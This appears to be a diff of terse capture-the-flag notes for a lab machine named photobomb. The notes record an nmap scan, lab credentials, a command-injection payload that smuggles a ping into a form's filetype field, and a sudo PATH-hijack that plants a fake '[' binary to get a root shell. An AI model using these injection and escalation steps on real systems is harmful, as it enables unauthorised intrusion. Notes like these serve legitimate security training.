@@ -1,0 +1,31 @@
+└─$ nmap -A 10.10.11.182 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-31 11:00 CEST
+Warning: 10.10.11.182 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.11.182
+Host is up (0.041s latency).
+Not shown: 60749 closed tcp ports (conn-refused), 4784 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
+|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
+|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://photobomb.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+http://pH0t0:b0Mb!@photobomb.htb/printer
+
+sudo tcpdump -ni tun0 icmp
+photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg;ping+10.10.14.5&dimensions=30x20
+
+
+touch /tmp/[
+echo '/bin/bash' > /tmp/[
+chmod +x /tmp/[
+sudo PATH=/tmp:$PATH /opt/cleanup.sh
+
+
+
